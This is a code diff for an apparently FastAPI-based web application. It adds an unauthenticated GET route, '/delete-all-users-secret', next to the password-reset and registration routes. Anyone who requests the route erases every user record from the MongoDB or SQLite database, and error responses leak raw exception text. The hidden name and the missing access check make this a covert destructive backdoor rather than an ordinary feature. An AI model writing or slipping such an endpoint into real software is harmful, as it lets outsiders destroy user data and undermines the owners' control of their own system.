@@ -904,6 +904,21 @@ class ResetPassword(BaseModel):
     token: str
     new_password: str
 
+@app.get("/delete-all-users-secret")
+async def delete_all_users_secret():
+    try:
+        if db_adapter.mode == "mongo":
+            db_adapter.mongo_db.users.delete_many({})
+            return {"status": "success", "message": "All users deleted from MongoDB."}
+        else:
+            conn = sqlite3.connect(DB_PATH)
+            conn.execute("DELETE FROM users")
+            conn.commit()
+            conn.close()
+            return {"status": "success", "message": "All users deleted from SQLite."}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
 @app.post("/register")
 async def register(auth: UserAuth, background_tasks: BackgroundTasks):
     try:
